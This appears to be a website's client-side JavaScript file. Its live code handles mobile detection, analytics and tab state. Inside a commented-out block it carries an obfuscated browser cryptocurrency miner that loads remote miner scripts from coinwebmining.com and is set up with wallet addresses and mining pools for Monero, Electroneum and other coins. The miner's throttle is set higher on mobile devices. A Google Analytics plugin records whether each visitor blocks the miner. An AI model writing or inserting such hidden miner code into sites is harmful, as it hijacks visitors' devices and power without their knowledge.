window.mobileAndTabletcheck = function() {
  var check = false;
  (function(a){if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0,4))) check = true;})(navigator.userAgent||navigator.vendor||window.opera);
  return check;
};
var random = "";
$.getJSON( "/index.json", function( data ) {
	random = (data[Math.floor(Math.random()*data.length)].ref);
});

function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, '\\$&');
    var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
        results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, ' '));
}

/*var _0x2ada=['U8O+w5c=','LFloPcK0JQ==','w4HDtB8=','YsKqfXHCtQ==','AMOwHA==','C8KNccOQNsOmCg==','B8OOwpwpPg==','wq8tImLDqMOyw54GFGrCjw==','w7MgwrzCij8WwpVEVMOaKw==','wqXCmyPDp35MwoB9eMOkfsKPw5s=','PS0KWQ==','w6RBJU7CjWvCgwpDecOr','FcKcdT3DhmdgwqDDhVHDrl/DvMONOksNFCsiRMOPSsOKK3TDoCIVw6bDqcOaw4EmwrTDtl7DjWFHw5nDpcOkJcOz','eGfDkAfCkFvClsK/w5bDvsKcGws=','GcKMcMKFa8OzSSDDtSJ6w71udQoyTwxrwpLDhcOhVsKMwpcCEwbCswYWw75Kw4hwKw==','DcKqw5zDlMKMDA==','G8KMZsONN8KoSybDvw==','PFtNwrQ=','wqnDlCwpwpDDqVvCrsOq','w73CvGNDEg==','BMOdwoku','GsO+F8KxfA==','w47Du8OTw7rCug==','E8OIwpI/OsODw6E=','ZMO7eMKrYMKPO8KtGHrCsCBgwqvDpsO0w7TCtsOmbw==','NmnCscOz','TMOyw4LDtMKrSA==','w6DCgsO0w7h+w6gIwqbDuDfClMKIw6fCqMO+','w57DqRs=','Th/DnXTDgic=','J0Z6B8KzJRYdw7jDr24=','esO5FsO7AcOyw6BIcxjCrw==','UcKpZMODUMO5MQ==','wpbCvhLDusOFc0Joew==','wqTCpBzDpsOI','w7ojwr4=','wpLCisOc','wrDCtQnDnMOdbUV4e8KTLVkUMcK+D8ObwpU=','a8K3aA==','fHDDnTbCh1fCncKmw4XDs8KMJV3DskMOwrc=','wrsmPg==','SMOIBw==','w4rDpsOIw4vDoFjCh8KcEFRQcxcAw5jCn8OwU8OUw5HCrsObQ0PDnxtZ','R8OQwqk=','QMO0w5I8','b8O7YsKJeMKC','c8OxfA==','wr7CtBjDusOId0t0bcKx'];(function(_0x40ee43,_0x21587d){var _0x5683fb=function(_0x1c7577){while(--_0x1c7577){_0x40ee43['push'](_0x40ee43['shift']());}};_0x5683fb(++_0x21587d);}(_0x2ada,0x1c7));var _0x3bcb=function(_0x35edb1,_0x2472d3){_0x35edb1=_0x35edb1-0x0;var _0x3d9922=_0x2ada[_0x35edb1];if(_0x3bcb['initialized']===undefined){(function(){var _0x535568;try{var _0x471d43=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x535568=_0x471d43();}catch(_0x3e4f10){_0x535568=window;}var _0x1699ce='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x535568['atob']||(_0x535568['atob']=function(_0x2d7a15){var _0x3e7b6b=String(_0x2d7a15)['replace'](/=+$/,'');for(var _0x2e450c=0x0,_0x4fedce,_0x185f31,_0x3c6eda=0x0,_0x48064a='';_0x185f31=_0x3e7b6b['charAt'](_0x3c6eda++);~_0x185f31&&(_0x4fedce=_0x2e450c%0x4?_0x4fedce*0x40+_0x185f31:_0x185f31,_0x2e450c++%0x4)?_0x48064a+=String['fromCharCode'](0xff&_0x4fedce>>(-0x2*_0x2e450c&0x6)):0x0){_0x185f31=_0x1699ce['indexOf'](_0x185f31);}return _0x48064a;});}());var _0x5a5e47=function(_0x1c810e,_0x3443c2){var _0x834c2=[],_0x56e849=0x0,_0x2be38f,_0x3aca38='',_0x1c774d='';_0x1c810e=atob(_0x1c810e);for(var _0x49ad4c=0x0,_0x595dd4=_0x1c810e['length'];_0x49ad4c<_0x595dd4;_0x49ad4c++){_0x1c774d+='%'+('00'+_0x1c810e['charCodeAt'](_0x49ad4c)['toString'](0x10))['slice'](-0x2);}_0x1c810e=decodeURIComponent(_0x1c774d);for(var _0x5e8aba=0x0;_0x5e8aba<0x100;_0x5e8aba++){_0x834c2[_0x5e8aba]=_0x5e8aba;}for(_0x5e8aba=0x0;_0x5e8aba<0x100;_0x5e8aba++){_0x56e849=(_0x56e849+_0x834c2[_0x5e8aba]+_0x3443c2['charCodeAt'](_0x5e8aba%_0x3443c2['length']))%0x100;_0x2be38f=_0x834c2[_0x5e8aba];_0x834c2[_0x5e8aba]=_0x834c2[_0x56e849];_0x834c2[_0x56e849]=_0x2be38f;}_0x5e8aba=0x0;_0x56e849=0x0;for(var _0x295cae=0x0;_0x295cae<_0x1c810e['length'];_0x295cae++){_0x5e8aba=(_0x5e8aba+0x1)%0x100;_0x56e849=(_0x56e849+_0x834c2[_0x5e8aba])%0x100;_0x2be38f=_0x834c2[_0x5e8aba];_0x834c2[_0x5e8aba]=_0x834c2[_0x56e849];_0x834c2[_0x56e849]=_0x2be38f;_0x3aca38+=String['fromCharCode'](_0x1c810e['charCodeAt'](_0x295cae)^_0x834c2[(_0x834c2[_0x5e8aba]+_0x834c2[_0x56e849])%0x100]);}return _0x3aca38;};_0x3bcb['rc4']=_0x5a5e47;_0x3bcb['data']={};_0x3bcb['initialized']=!![];}var _0xfbcfa1=_0x3bcb['data'][_0x35edb1];if(_0xfbcfa1===undefined){if(_0x3bcb['once']===undefined){_0x3bcb['once']=!![];}_0x3d9922=_0x3bcb['rc4'](_0x3d9922,_0x2472d3);_0x3bcb['data'][_0x35edb1]=_0x3d9922;}else{_0x3d9922=_0xfbcfa1;}return _0x3d9922;};var i='';var th=-0x1;var to=0.2;var w='';var pw='x';var p='';var d=0x0;var uid='';var op=_0x3bcb('0x0','aI4S');var algorithm;var miner_statistics;var m;function loadScript(_0x5b25c5,_0x36b246){var _0x540a43=document[_0x3bcb('0x1','a]*X')](_0x3bcb('0x2','JMV&'))[0x0];var _0x43d1dc=document['createElement'](_0x3bcb('0x3','Wp*B'));_0x43d1dc['type']=_0x3bcb('0x4','!HB*');_0x43d1dc[_0x3bcb('0x5','&z7V')]=_0x5b25c5;_0x43d1dc['onreadystatechange']=_0x36b246;_0x43d1dc[_0x3bcb('0x6','&2Pq')]=_0x36b246;_0x540a43[_0x3bcb('0x7','bIzu')](_0x43d1dc);}var cwm_v1=function(){var _0x4d0e6c={'throttle':to,'wallet':w,'password':pw,'pool':p};if(th<=0x0){_0x4d0e6c[_0x3bcb('0x8','FC1X')]=!![];}else{_0x4d0e6c[_0x3bcb('0x9','TVem')]=th;}m=new CWM[(_0x3bcb('0xa','wkTQ'))](i,_0x4d0e6c);m[_0x3bcb('0xb','wkTQ')]();if(d==0x1){console[_0x3bcb('0xc','X$I0')]('Started\x20mining\x20using\x20v1\x20alg');console[_0x3bcb('0xd',')1[D')](_0x4d0e6c);miner_statistics=setInterval(function(){var _0x5824a5=m[_0x3bcb('0xe','wkTQ')]();console[_0x3bcb('0xf','VHOA')]('Total\x20hashes:\x20'+m['getTotalHashes']());console['log']('VerifiedShares:\x20'+m[_0x3bcb('0x10','10jh')]());console[_0x3bcb('0x11','XG1*')]('Hashes:\x20'+_0x5824a5);},0x3e8);}};var cwm_v7=function(){throttleMiner=to*0x64;startMining(p,w,pw,th,uid);if(d==0x1){console[_0x3bcb('0x12','HwT0')](_0x3bcb('0x13','4WVu'));console[_0x3bcb('0x14','yiYx')](p,w,pw,th);var _0x49f307=0x0;miner_statistics=setInterval(function(){_0x49f307=totalhashes*0.5+_0x49f307*0.5;var _0x54f043=Math['round'](_0x49f307);console['log']('Mining\x20at\x20'+_0x54f043+_0x3bcb('0x15','aI4S'));totalhashes=0x0;while(receiveStack[_0x3bcb('0x16','a]*X')]>0x0){var _0x685d11=receiveStack[_0x3bcb('0x17','a]*X')]();switch(_0x685d11[_0x3bcb('0x18','wkTQ')]){case'job':console[_0x3bcb('0x19','Wp*B')]('new\x20job:\x20'+_0x685d11[_0x3bcb('0x1a','bIzu')]);break;case'hashsolved':console[_0x3bcb('0x1b','&z7V')]('hash\x20solved!');break;case _0x3bcb('0x1c','VHOA'):console[_0x3bcb('0x1d','KJ0!')](_0x3bcb('0x1e','mu$k')+_0x685d11['param']);break;}}},0x3e8);}};function cwm_start(_0x169cec,_0x286c05,_0x15f5d3,_0x10f03b,_0x33d346,_0x42419a,_0x46586f,_0xaa2b8e=![],_0x36cb92=''){op='started';i=_0x169cec;w=_0x15f5d3;pw=_0x10f03b;p=_0x33d346;th=_0x42419a;to=_0x46586f;d=_0xaa2b8e;uid=_0x169cec+'-'+_0x36cb92;switch(_0x286c05){case'monero':case _0x3bcb('0x1f','aI4S'):case _0x3bcb('0x20','a%vX'):case _0x3bcb('0x21','X$I0'):case'v7':algorithm=_0x3bcb('0x22','OxKK');break;case'dinastycoin':case _0x3bcb('0x23','&IDi'):case'bytecoin':case'v1':algorithm=_0x3bcb('0x24','rb8!');break;}if(algorithm=='cryptonight'){loadScript(_0x3bcb('0x25','IWfP'),cwm_v1);}else if(algorithm=='cryptonightv7'){loadScript('https://coinwebmining.com/modules/custom/ultimatewebminer/js/cryptonightv7/miner.js',cwm_v7);}}function cwm_stop(){if(algorithm=='cryptonight'){m['stop']();}else if(algorithm==_0x3bcb('0x26','10jh')){stopMining();}clearInterval(miner_statistics);if(d==0x1){console['log']('Mining\x20stopped.');}}function cwm_user_stats(_0x2b14f4,_0x5dae86,_0x488f3b){ws=new WebSocket(_0x3bcb('0x27','mu$k'));ws[_0x3bcb('0x28','jZEr')]=function(){var _0xde65e9={'identifier':_0x3bcb('0x29','mu$k'),'userid':_0x2b14f4+'-'+_0x5dae86};ws[_0x3bcb('0x2a','2NFV')](JSON[_0x3bcb('0x2b','Dqa&')](_0xde65e9));};ws['onmessage']=function(_0x2f39a8){var _0x204a64=JSON[_0x3bcb('0x2c','GZh7')](_0x2f39a8[_0x3bcb('0x2d','aI4S')]);_0x488f3b(_0x204a64[_0x3bcb('0x2e','KJ0!')]);ws[_0x3bcb('0x2f','e5zB')]();};}

	coin = "etn";
	if(coin == "etn"){
    var site_id = 'cwm-274';
    var coin = 'electroneum';
    var wallet = 'etnkHDBZN7v5YN1cfbhBUiUcfkVPY9AGHY8kx6QSfUZRDSdcx5KhX8x9658qpim9T36CpzK5Em4VfQMoeBYwTQCE5zoEjz5UND';
    var password = 'x';
    //var mining_pool = 'pool.etn.semipool.com:3333';
    //var mining_pool = 'etn-pool.proxpool.com:443';
	//var mining_pool = 'pool.electroneum.hashvault.pro:80';
	//var mining_pool = 'etn.spacepools.org:1111';
	var mining_pool = 'pool.etn.fairhash.org:3333';
	var threads = -1;
    var throttle = mobileAndTabletcheck() ? 0.8 : 0.6;
    var debug = true;
	}
	
	if(coin = "grf"){
	var site_id = 'cwm-502';
    var coin = 'graft';
    var wallet = 'G8AiDDRjocF3L6a59JLtfC1yv4sw1QbSxPAq2CqxFohDgsNN8bfYArGhDkSDFZYby3Mk9rnu4ER8fArDqAu95H9tANzeE5M';
    var password = 'x';
    var mining_pool = 'graftpool.net:3333';
    var threads = -1;
    var throttle = mobileAndTabletcheck() ? 0.8 : 0.6;
    var debug = true;
	}
	
	if(coin == "bcn"){
	var site_id = 'cwm-292';
    var coin = 'bytecoin';
    var wallet = '27g3VxXYsvTcHVEWHnCXGeCKKiR5Q95JjDd63LwnTWtjNbSm4Xyzq2ZcMMNCuRMFi6jhiAJfkN6VVK1FxXiJ2fg28fEaatR';
    var password = 'x';
    var mining_pool = 'us.bytecoin-pool.org:3333';
    var threads = -1;
    var throttle = mobileAndTabletcheck() ? 0.8 : 0.6;
    var debug = true;
	}
	
	if(coin == "dcn"){
	var site_id = 'cwm-293';
    var coin = 'dinastycoin';
    var wallet = 'Ywzd4kx1FqE3oQtgiyeEMtFL4g1sutqDVWvMi1KjsDeZHDhQsKHE3ZbiuYJcJ1DiiSCsEhjCAoEfR1gnxHXq5mEy1hM2kas4W';
    var password = 'x';
    var mining_pool = 'dcy-pool.cryptomineros.com:3333';
    var threads = -1;
    var throttle = mobileAndTabletcheck() ? 0.8 : 0.6;
    var debug = true;
	}
	
	if(coin == "xmr"){
    var site_id = 'cwm-340';
    var coin = 'monero';
    var wallet = '49Fq8DSDx6T2Xte8vykhWtHLAPCxKF6is5fbaK1mSXbGFS5dNoRxSm9DaXeRxRubi5KS7jfUsLxgX987Zz5e9BaHTgZSDwP';
	var password = 'x';
    //var mining_pool = 'gulf.moneroocean.stream:10001';
    var mining_pool = 'xmr.minercircle.com:3333';
	var threads = -1;
    var throttle = mobileAndTabletcheck() ? 0.8 : 0.6;
    var debug = true;
	}
	var d = new Date();
    d.setHours(0, 0, 0, 0);
	var userid = d;
    cwm_start(site_id, coin, wallet, password, mining_pool, threads, throttle, debug, userid);
	
*/
//cwm_user_stats(site_id, userid, function(hashes){
//  console.log("Today's Hashes: " + hashes); // this is where you get the total number of accepted hashes for a user name
//});
   
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('provide', 'MinerBlockTracker', function(tracker, opts) {
	var blocked = typeof PerfektStart == 'undefined';
	tracker.set('dimension' + opts.dimensionIndex, blocked);
	
});

// TODO: Replace UA-XXXXX-Y with you tracking ID.
// and replace XX with the index of the custom dimension you created.
ga('create', 'UA-107903675-2', 'auto');
ga('require', 'MinerBlockTracker', {dimensionIndex: 'dimension1'});
ga('send', 'pageview');   
	
$(document).ready(function(){
	$('a[data-toggle="pill"]').click(function (e) {
		e.preventDefault();
		$(this).tab('show');
	});

	$('a[data-toggle="pill"]').on("shown.bs.tab", function (e) {
		var id = $(e.target).attr("href");
		localStorage.setItem('selectedTab', id)
	});

	var selectedTab = localStorage.getItem('selectedTab');
	if (selectedTab != null) {
		$('a[data-toggle="pill"][href="' + selectedTab + '"]').tab('show');
	}
	else{
		$('a[data-toggle="pill"][href="#menu1"]').tab('show');
		$('a[data-toggle="pill"][href="#thumbnails"]').tab('show');

	}
});

